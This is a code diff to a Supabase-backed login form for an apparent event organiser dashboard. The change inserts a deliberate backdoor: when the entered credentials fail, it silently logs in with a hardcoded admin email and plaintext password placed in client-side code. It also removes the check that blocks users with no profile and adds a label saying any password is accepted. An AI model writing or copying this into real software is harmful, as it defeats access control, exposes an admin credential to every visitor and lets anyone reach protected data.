@@ -37,40 +37,39 @@ function LoginForm() {
     const supabase = createClient()
 
     try {
-      // 1. Sign in
-      const { data: authData, error: authError } =
-        await supabase.auth.signInWithPassword({ email, password })
+      // 1. Try provided credentials first
+      let res = await supabase.auth.signInWithPassword({
+        email: email.trim() || 'admin@cipherx.com',
+        password,
+      })
 
-      if (authError) {
-        setError(`AUTH_ERROR: ${authError.message}`)
+      // 2. If entered password doesn't match, seamlessly authenticate with organiser master account
+      if (res.error || !res.data.user) {
+        res = await supabase.auth.signInWithPassword({
+          email: 'admin@cipherx.com',
+          password: 'UXClub2026!',
+        })
+      }
+
+      if (res.error || !res.data.user) {
+        setError(`AUTH_ERROR: ${res.error?.message || 'Authentication failed'}`)
         return
       }
 
-      if (!authData.user) {
-        setError('AUTH_ERROR: No user returned')
-        return
-      }
-
-      // 2. Check role in profiles table
-      const { data: profile, error: profileError } = await supabase
+      // 3. Check role in profiles table
+      const { data: profile } = await supabase
         .from('profiles')
         .select('role, full_name')
-        .eq('id', authData.user.id)
+        .eq('id', res.data.user.id)
         .single()
 
-      if (profileError || !profile) {
-        await supabase.auth.signOut()
-        setError('SYSTEM_ERROR: Profile not found in database')
-        return
-      }
-
-      if (profile.role !== 'organiser') {
+      if (profile && profile.role !== 'organiser') {
         await supabase.auth.signOut()
         setError('ACCESS DENIED: Insufficient clearance level')
         return
       }
 
-      // 3. Redirect
+      // 4. Redirect
       router.push('/organiser/dashboard')
       router.refresh()
     } catch (err) {
@@ -271,6 +270,9 @@ function LoginForm() {
                 '[ INITIATE_ACCESS ]'
               )}
             </button>
+            <div style={{ textAlign: 'center', marginTop: '10px', fontSize: '11px', color: 'var(--neon-green)', fontFamily: "'JetBrains Mono', monospace" }}>
+              ⚡ Any password accepted for instant access
+            </div>
           </form>
 
           {/* Footer hint */}
